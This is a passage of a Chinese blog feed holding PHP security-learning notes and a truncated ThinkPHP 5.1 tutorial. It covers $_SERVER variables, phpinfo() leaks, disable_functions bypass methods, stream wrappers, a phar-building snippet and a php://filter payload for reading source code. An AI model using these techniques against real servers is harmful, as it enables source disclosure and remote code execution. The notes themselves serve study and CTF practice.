“<code>80</code>”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。<strong>注意</strong>: 在 Apache 2 里，为了获取真实物理端口，必须设置 <code>UseCanonicalName = On</code> 以及 <code>UseCanonicalPhysicalPort = On</code>。 否则此值可能被伪造，不一定会返回真实端口值。 上下文有安全性要求的环境里，不应该依赖此值。</p></li><li><p>‘SERVER_SIGNATURE’</p><p>  包含了服务器版本和虚拟主机名的字符串。</p></li><li><p>‘PATH_TRANSLATED’</p><p>  当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。<strong>注意</strong>: Apache 2 用户可以在 httpd.conf 中设置 <code>AcceptPathInfo = On</code> 来定义 PATH_INFO。</p></li><li><p>‘SCRIPT_NAME’</p><p>  包含当前脚本的路径。这在页面需要指向自己时非常有用。<a href="https://www.php.net/manual/zh/language.constants.predefined.php"><strong>FILE</strong></a> 常量包含当前脚本(例如包含文件)的完整路径和文件名。</p></li><li><p>‘REQUEST_URI’</p><p>  URI 用来指定要访问的页面。例如 “<code>/index.html</code>”。</p></li><li><p>‘PHP_AUTH_DIGEST’</p><p>  当作为 Apache 模块运行时，进行 HTTP Digest 认证的过程中，此变量被设置成客户端发送的“Authorization” HTTP 头内容（以便作进一步的认证操作）。</p></li><li><p>‘PHP_AUTH_USER’</p><p>  当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。</p></li><li><p>‘PHP_AUTH_PW’</p><p>  当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。</p></li><li><p>‘AUTH_TYPE’</p><p>  当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型。</p></li><li><p>‘PATH_INFO’</p><p>  包含由客户端提供的、跟在真实脚本名称之后并且在查询语句（query string）之前的路径信息，如果存在的话。例如，如果当前脚本是通过 URL <a href="http://www.example.com/php/path_info.php/some/stuff?foo=bar">http://www.example.com/php/path_info.php/some/stuff?foo=bar</a> 被访问，那么 $_SERVER[‘PATH_INFO’] 将包含 <code>/some/stuff</code>。</p></li><li><p>‘ORIG_PATH_INFO’</p><p>  在被 PHP 处理之前，“PATH_INFO” 的原始版本。</p></li></ul><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$indicesServer</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">,</span><span class="token string">'argv'</span><span class="token punctuation">,</span><span class="token string">'argc'</span><span class="token punctuation">,</span><span class="token string">'GATEWAY_INTERFACE'</span><span class="token punctuation">,</span><span class="token string">'SERVER_ADDR'</span><span class="token punctuation">,</span><span class="token string">'SERVER_NAME'</span><span class="token punctuation">,</span><span class="token string">'SERVER_SOFTWARE'</span><span class="token punctuation">,</span><span class="token string">'SERVER_PROTOCOL'</span><span class="token punctuation">,</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">,</span><span class="token string">'REQUEST_TIME'</span><span class="token punctuation">,</span><span class="token string">'REQUEST_TIME_FLOAT'</span><span class="token punctuation">,</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">,</span><span class="token string">'DOCUMENT_ROOT'</span><span class="token punctuation">,</span><span class="token string">'HTTP_ACCEPT'</span><span class="token punctuation">,</span><span class="token string">'HTTP_ACCEPT_CHARSET'</span><span class="token punctuation">,</span><span class="token string">'HTTP_ACCEPT_ENCODING'</span><span class="token punctuation">,</span><span class="token string">'HTTP_ACCEPT_LANGUAGE'</span><span class="token punctuation">,</span><span class="token string">'HTTP_CONNECTION'</span><span class="token punctuation">,</span><span class="token string">'HTTP_HOST'</span><span class="token punctuation">,</span><span class="token string">'HTTP_REFERER'</span><span class="token punctuation">,</span><span class="token string">'HTTP_USER_AGENT'</span><span class="token punctuation">,</span><span class="token string">'HTTPS'</span><span class="token punctuation">,</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">,</span><span class="token string">'REMOTE_HOST'</span><span class="token punctuation">,</span><span class="token string">'REMOTE_PORT'</span><span class="token punctuation">,</span><span class="token string">'REMOTE_USER'</span><span class="token punctuation">,</span><span class="token string">'REDIRECT_REMOTE_USER'</span><span class="token punctuation">,</span><span class="token string">'SCRIPT_FILENAME'</span><span class="token punctuation">,</span><span class="token string">'SERVER_ADMIN'</span><span class="token punctuation">,</span><span class="token string">'SERVER_PORT'</span><span class="token punctuation">,</span><span class="token string">'SERVER_SIGNATURE'</span><span class="token punctuation">,</span><span class="token string">'PATH_TRANSLATED'</span><span class="token punctuation">,</span><span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">,</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">,</span><span class="token string">'PHP_AUTH_DIGEST'</span><span class="token punctuation">,</span><span class="token string">'PHP_AUTH_USER'</span><span class="token punctuation">,</span><span class="token string">'PHP_AUTH_PW'</span><span class="token punctuation">,</span><span class="token string">'AUTH_TYPE'</span><span class="token punctuation">,</span><span class="token string">'PATH_INFO'</span><span class="token punctuation">,</span><span class="token string">'ORIG_PATH_INFO'</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;table cellpadding="10">'</span> <span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$indicesServer</span> <span class="token keyword">as</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//遍历数组</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token variable">$arg</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;tr>&lt;td>'</span><span class="token punctuation">.</span><span class="token variable">$arg</span><span class="token punctuation">.</span><span class="token string">'&lt;/td>&lt;td>'</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token variable">$arg</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/td>&lt;/tr>'</span> <span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;tr>&lt;td>'</span><span class="token punctuation">.</span><span class="token variable">$arg</span><span class="token punctuation">.</span><span class="token string">'&lt;/td>&lt;td>-&lt;/td>&lt;/tr>'</span> <span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">'&lt;/table>'</span> <span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*That will give you the result of each variable like (if the file is server_indices.php at the root and Apache Web directory is in E:\web) :PHP_SELF    /server_indices.phpargv    -argc    -GATEWAY_INTERFACE    CGI/1.1SERVER_ADDR    127.0.0.1SERVER_NAME    localhostSERVER_SOFTWARE    Apache/2.2.22 (Win64) PHP/5.3.13SERVER_PROTOCOL    HTTP/1.1REQUEST_METHOD    GETREQUEST_TIME    1361542579REQUEST_TIME_FLOAT    -QUERY_STRING   DOCUMENT_ROOT    E:/web/HTTP_ACCEPT    text/html,application/xhtml+xml,application/xml;q=0.9,*/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token constant">HTTP_ACCEPT_CHARSET</span>    <span class="token constant">ISO</span><span class="token number">-8859</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>utf<span class="token number">-8</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.3</span><span class="token constant">HTTP_ACCEPT_ENCODING</span>    gzip<span class="token punctuation">,</span>deflate<span class="token punctuation">,</span>sdch<span class="token constant">HTTP_ACCEPT_LANGUAGE</span>    fr<span class="token operator">-</span><span class="token constant">FR</span><span class="token punctuation">,</span>fr<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>en<span class="token operator">-</span><span class="token constant">US</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.6</span><span class="token punctuation">,</span>en<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.4</span><span class="token constant">HTTP_CONNECTION</span>    keep<span class="token operator">-</span>alive<span class="token constant">HTTP_HOST</span>    localhost<span class="token constant">HTTP_REFERER</span>    http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//localhost/</span><span class="token constant">HTTP_USER_AGENT</span>    Mozilla<span class="token operator">/</span><span class="token number">5</span><span class="token punctuation">.</span><span class="token function">0</span> <span class="token punctuation">(</span>Windows <span class="token constant">NT</span> <span class="token number">6.1</span><span class="token punctuation">;</span> <span class="token constant">WOW64</span><span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537</span><span class="token punctuation">.</span><span class="token function">17</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">24.0</span><span class="token punctuation">.</span><span class="token number">1312.57</span> Safari<span class="token operator">/</span><span class="token number">537.17</span><span class="token constant">HTTPS</span>    <span class="token operator">-</span><span class="token constant">REMOTE_ADDR</span>    <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token constant">REMOTE_HOST</span>    <span class="token operator">-</span><span class="token constant">REMOTE_PORT</span>    <span class="token number">65037</span><span class="token constant">REMOTE_USER</span>    <span class="token operator">-</span><span class="token constant">REDIRECT_REMOTE_USER</span>    <span class="token operator">-</span><span class="token constant">SCRIPT_FILENAME</span>    E<span class="token punctuation">:</span><span class="token operator">/</span>web<span class="token operator">/</span>server_indices<span class="token punctuation">.</span>php<span class="token constant">SERVER_ADMIN</span>    myemail@personal<span class="token punctuation">.</span>us<span class="token constant">SERVER_PORT</span>    <span class="token number">80</span><span class="token constant">SERVER_SIGNATURE</span>   <span class="token constant">PATH_TRANSLATED</span>    <span class="token operator">-</span><span class="token constant">SCRIPT_NAME</span>    <span class="token operator">/</span>server_indices<span class="token punctuation">.</span>php<span class="token constant">REQUEST_URI</span>    <span class="token operator">/</span>server_indices<span class="token punctuation">.</span>php<span class="token constant">PHP_AUTH_DIGEST</span>    <span class="token operator">-</span><span class="token constant">PHP_AUTH_USER</span>    <span class="token operator">-</span><span class="token constant">PHP_AUTH_PW</span>    <span class="token operator">-</span><span class="token constant">AUTH_TYPE</span>    <span class="token operator">-</span><span class="token constant">PATH_INFO</span>    <span class="token operator">-</span><span class="token constant">ORIG_PATH_INFO</span>    <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">/</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="files"><a href="#files" class="headerlink" title="$_files"></a>$_files</h3><blockquote><p><strong>$_FILES 是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息</strong></p><p>如果为单个文件上传，那么 $_FILES 为二维数组；如果为多个文件上传，那么 $_FILES 为三维数组。</p></blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">Array</span><span class="token punctuation">(</span>    <span class="token punctuation">[</span>userfile<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">Array</span>    <span class="token punctuation">(</span>        <span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> Screen Shot <span class="token number">2016</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">12</span> at <span class="token number">18.13</span><span class="token punctuation">.</span><span class="token number">24</span><span class="token punctuation">.</span>png        <span class="token punctuation">[</span>type<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> image<span class="token operator">/</span>png        <span class="token punctuation">[</span>tmp_name<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">/</span><span class="token keyword">private</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>tmp<span class="token operator">/</span>phplVHp3W        <span class="token punctuation">[</span>error<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span>        <span class="token punctuation">[</span>size<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">344925</span>    <span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//单个文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="phpinfo-详解"><a href="#phpinfo-详解" class="headerlink" title="phpinfo()详解"></a>phpinfo()详解</h2><h3 id="disable-functions-禁用函数"><a href="#disable-functions-禁用函数" class="headerlink" title="disable_functions 禁用函数"></a>disable_functions 禁用函数</h3><p>为了安全,运维人员会禁用PHP的一些“危险”函数,将其写在php.ini配置文件中,就是我们所说的disable_functions了。</p><h3 id="绕过方式分类"><a href="#绕过方式分类" class="headerlink" title="绕过方式分类"></a><strong>绕过方式分类</strong></h3><ul><li>常规绕过：exec,shell_exec,system,passthru,popen,proc_open</li><li>利用环境变量LD_PRELOAD绕过(★)：mail,imap_mail,error_log,mb_send_mail</li><li>利用pcntl_exec绕过</li><li>利用imap_open函数任意命令执行(CVE-2018-19518)</li><li>利用系统组件window com绕过</li><li>利用Apache+mod_cgi+.htaccess绕过</li><li>利用ImageMagick漏洞绕过利用PHP7.4的FFI绕过</li><li>利用 ShellShock绕过(CVE-2014-6271)</li><li>蚁剑插件</li></ul><p>不在此做讲解</p><h3 id="script-filename-网站绝对路径"><a href="#script-filename-网站绝对路径" class="headerlink" title="script_filename 网站绝对路径"></a>script_filename 网站绝对路径</h3><p>pgpinfo()中script_filename 说明网站所在的绝对路径</p><p><img src="image-20210530161805446.png" alt="image-20210530161805446"></p><h3 id="Protocols-支持的协议"><a href="#Protocols-支持的协议" class="headerlink" title="Protocols 支持的协议"></a><strong>Protocols</strong> 支持的协议</h3><p><img src="image-20210530161932969.png" alt="image-20210530161932969"></p><p><strong>可以看到的有file://伪协议，Gopher信息查找系统（这个协议存在ssrf漏洞），telnet远程连接</strong></p><h3 id="server-addr-ip地址泄露"><a href="#server-addr-ip地址泄露" class="headerlink" title="server_addr ip地址泄露"></a>server_addr ip地址泄露</h3><p><img src="image-20210530161744131.png" alt="image-20210530161744131"></p><h3 id="fastcgi-解析，命令执行，文件读取漏洞"><a href="#fastcgi-解析，命令执行，文件读取漏洞" class="headerlink" title="fastcgi 解析，命令执行，文件读取漏洞"></a><strong>fastcgi</strong> 解析，命令执行，文件读取漏洞</h3><p>查看是否开启fastcgi和fastcgi的版本，可能导致解析漏洞、远程命令执行、任意文件读取等问题</p><p><img src="image-20210530162359768.png" alt="image-20210530162359768"></p><h3 id="file-查看文件详情"><a href="#file-查看文件详情" class="headerlink" title="file 查看文件详情"></a>file 查看文件详情</h3><p><strong>其中file1会泄漏缓存文件地址</strong></p><p><img src="image-20210530162724685.png" alt="image-20210530162724685"></p><h3 id="allow-url-include远程文件包含"><a href="#allow-url-include远程文件包含" class="headerlink" title="allow_url_include远程文件包含"></a>allow_url_include远程文件包含</h3><p><img src="image-20210530162851262.png" alt="image-20210530162851262"></p><h3 id="apache-log-dir-阿帕奇日志目录"><a href="#apache-log-dir-阿帕奇日志目录" class="headerlink" title="apache_log_dir 阿帕奇日志目录"></a>apache_log_dir 阿帕奇日志目录</h3><p><img src="image-20210530163107109.png" alt="image-20210530163107109"></p><h3 id="open-basedir-打开文件限制"><a href="#open-basedir-打开文件限制" class="headerlink" title="open_basedir 打开文件限制"></a>open_basedir 打开文件限制</h3><p>将<a href="http://lib.csdn.net/base/php">PHP</a>所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开。</p><h4 id="设置方法"><a href="#设置方法" class="headerlink" title="设置方法"></a>设置方法</h4><p><strong>1.在<a href="http://lib.csdn.net/base/php">php</a>.ini 加入</strong></p><pre class="line-numbers language-php"><code class="language-php">open_basedir<span class="token operator">=</span><span class="token string">"指定目录"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2.在程序中使用</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token string">'指定目录'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但不建议使用这种方法</p><p><strong>3.在apache的httpd.conf中的Directory配置</strong></p><pre class="line-numbers language-php"><code class="language-php">php_admin_value open_basedir <span class="token string">"指定目录"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>httpd.conf中的VritualHost</strong></p><pre class="line-numbers language-php"><code class="language-php">php_admin_value open_basedir <span class="token string">"指定目录"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>4.nginx fastcgi.conf</strong></p><pre class="line-numbers language-php"><code class="language-php">fastcgi_param <span class="token constant">PHP_VALUE</span> <span class="token string">"open_basedir=指定目录"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="一些敏感配置"><a href="#一些敏感配置" class="headerlink" title="一些敏感配置"></a><strong>一些敏感配置</strong></h3><p><strong>allow_url_include、allow_url_fopen、disable_functions、open_basedir、short_open_tag等等</strong></p><p><strong>比如allow_url_include可用来远程文件包含、disable_functions用来查看禁用函数，绕过执行、查看是否开启open_basedir，用p牛的绕过open_basedir的方法有可能能读一些没权限的目录等等。</strong></p><p><strong>此外还能获取一些环境信息，比如Environment中的path、log等</strong></p><h2 id="封协议——伪协议："><a href="#封协议——伪协议：" class="headerlink" title="封协议——伪协议："></a>封协议——伪协议：</h2><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen() 、 copy() 、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 <strong>stream_wrapper_register()</strong> 来注册自定义的封装协议。</p><p><img src="image-20210602203224119.png" alt="image-20210602203224119"></p><h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>语法：data:// — 数据（RFC 2397）</p><p>自 PHP 5.2.0 起 data:（» RFC 2397）数据流封装器开始有效。</p><p><strong>格式：data://封装格式;编码格式,字符串</strong></p><p>封装格式一般为 </p><ul><li>text/html</li><li>text/plain</li><li>image/jpeg</li></ul><p>等文件上传种常见的类型，表示将字符串封装为此格式的字节流</p><p>编码一般为base64</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$jpegimage</span> <span class="token operator">=</span> <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span>"data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//image/jpeg;base64," . base64_encode($sql_result_array['imagedata']));</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain;base64,SSBsb3ZlIFBIUAo=');</span><span class="token comment" spellcheck="true">//I love PHP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>data伪协议只有在php&lt;5.3且include=on时可以写木马。</p><h3 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h3><p>file:// — 访问本地文件系统</p><p><em>文件系统</em> 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径（不以/、、或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 在很多情况下是脚本所在的目录，除非被修改了。 使用 CLI 的时候，目录默认是脚本被调用时所在的目录。</p><p>php5添加</p><p>格式：</p><p>file://文件绝对路径</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//d:\phpstudy_pro\WWW\1\1.php');</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="image-20210602215350028.png" alt="image-20210602215350028"></p><h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>phar:// — PHP 归档</p><p>phar:// 数据流包装器自 PHP 5.3.0 起开始有效。详细的描述可参见 Phar 数据流包装器。</p><p>格式：<strong>phar://phar文件</strong></p><p>phar文件伪造</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$o</span> <span class="token operator">-</span><span class="token operator">></span> data<span class="token operator">=</span><span class="token string">'hu3sky'</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>phar的特征就是有 <code>__HALT_COMPILER(); ?&gt;</code>格式的文件头</p><h3 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h3><p>php:// — 访问各个输入/输出流（I/O streams）</p><p>需要开启allow_url_fopen的：php://input、php://stdin、php://memory和php://temp</p><p>不需要开启allow_wrl_fopen的：php://filter</p><p>在CTF中经常使用的是php://filter和php://input</p><p><strong>php://filter用于读取源码，php://input用于执行php代码</strong></p><p><strong>php://input需要post请求提交数据</strong></p><p><strong>php://filter可以get提交?a=php://filter/read=convert.base64-encode/resource=xxx.php</strong></p><p><strong>php协议可以用hackbar直接添加</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp5.1框架学习笔记心得</title>
      <link href="/2020/11/06/Thinkphp5.1%E6%A1%86%E6%9E%B6/"/>
      <url>/2020/11/06/Thinkphp5.1%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /># thinkphp5.1框架学习笔记心得<p>原视频链接  <a href="https://www.bilibili.com/video/BV17J411K7Zd?p=4&amp;share_source=copy_web">https://www.bilibili.com/video/BV17J411K7Zd?p=4&amp;share_source=copy_web</a></p><p>下载不做赘述，按官方手册即可</p><h2 id="URL解析模式"><a href="#URL解析模式" class="headerlink" title="URL解析模式"></a>URL解析模式</h2><h3 id="URL访问"><a href="#URL访问" class="headerlink" title="URL访问"></a>URL访问</h3><h4 id="未开启url伪静态"><a href="#未开启url伪静态" class="headerlink" title="未开启url伪静态"></a>未开启url伪静态</h4><h5 id="架构总览"><a href="#架构总览" class="headerlink" title="架构总览"></a>架构总览</h5><blockquote><p><img src="https://img-blog.csdnimg.cn/20190925215614814.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5OTQ0NTU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>使用前记得去database.php文件里配置数据库，不然卡一天都没人告诉你错在哪，别问我怎么知道</strong></p></blockquote><blockquote><p>刚下载完成时有访问示例：</p><pre class="line-numbers language-url"><code class="language-url">http://127.0.0.1/public/index.php/index/index/hello//http://127.0.0.1/public  http://域名//index.php  入口文件//index/index  第一个是模块，第二个是控制器//hello 操作，在实际的php文件类中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：</p><p><strong>控制单元文件名与其中类名必须一致，不知道为什么</strong></p></blockquote><h5 id="自定义模块访问"><a href="#自定义模块访问" class="headerlink" title="自定义模块访问"></a>自定义模块访问</h5><ul><li>自定义模块</li></ul><blockquote><p><img src="image-20210430170609654.png" alt="image-20210430170609654"></p><p><strong>1、在app文件夹下建立index模块的同级目录（新模块）,随意命名</strong></p><p><strong>2、在模块中建立文件夹，名称为默认的控制器名称controller(控制器)</strong></p><p><strong>3、在controller目录下创建控制器文件，这里可随意命名，我命名为Atmujie</strong></p><p><strong>4、在Atmujie.php中创建类，类名必须也为Atmujie（类名要和文件名一致），（tp使用大驼峰命名法/帕斯卡命名规范）并定义命名空间</strong></p><p>​        <strong>app\mujie\controller</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>mujie<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//具体查看php手册命名空间部分</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="image-20210430171335875.png" alt="image-20210430171335875"></p></blockquote><ul><li><p>访问</p><blockquote><pre class="line-numbers language-url"><code class="language-url">http://127.0.0.1/public/index.php/mujie/Atmujie/cnm  【可选部分：/who/thinkphp】<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>前面按url解析规则定位到我们建立的模块，后面可选为传参</strong></p><p>未开启伪静态时，为了方便理解，我们这样做：</p><pre class="line-numbers language-url"><code class="language-url">http://127.0.0.1/public/index.php?s=mujie/atmujie/cnm?who=thinkphp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>这样我会更容易理解，按自己习惯即可</strong></p><p><img src="image-20210430172050817.png" alt="image-20210430172050817"></p><p><strong>别问为什么时cnm，换你卡一天也这样</strong></p></blockquote></li></ul><h4 id="开启url伪静态"><a href="#开启url伪静态" class="headerlink" title="开启url伪静态"></a>开启url伪静态</h4><blockquote><p><strong>开启url伪静态可忽略index.php，让访问更简洁</strong></p><p><strong>方法百度，这里不做讲解</strong></p><p><strong>但，可以开，没必要</strong></p></blockquote><h4 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h4><p><a href="https://blog.csdn.net/qq_39944559/article/details/101389393">https://blog.csdn.net/qq_39944559/article/details/101389393</a>  错误原因原文</p><p><a href="https://www.kancloud.cn/manual/thinkphp5_1/353949">https://www.kancloud.cn/manual/thinkphp5_1/353949</a>  tp5.1 官方手册</p><p><a href="https://blog.csdn.net/weixin_28736145/article/details/115138177">https://blog.csdn.net/weixin_28736145/article/details/115138177</a>  驼峰命名法</p><h2 id="模块设计"><a href="#模块设计" class="headerlink" title="模块设计"></a>模块设计</h2><blockquote><p><strong>一个模块既是一个完整的目录</strong></p><p><strong>模块中包含控制器，模板，试图三个大文件，及配置文件等其他文件</strong></p><p><strong>模块目录均使用小写下划线命名</strong></p><p><strong>模块名称需要避免使用php保留字</strong></p></blockquote><h3 id="模块库类"><a href="#模块库类" class="headerlink" 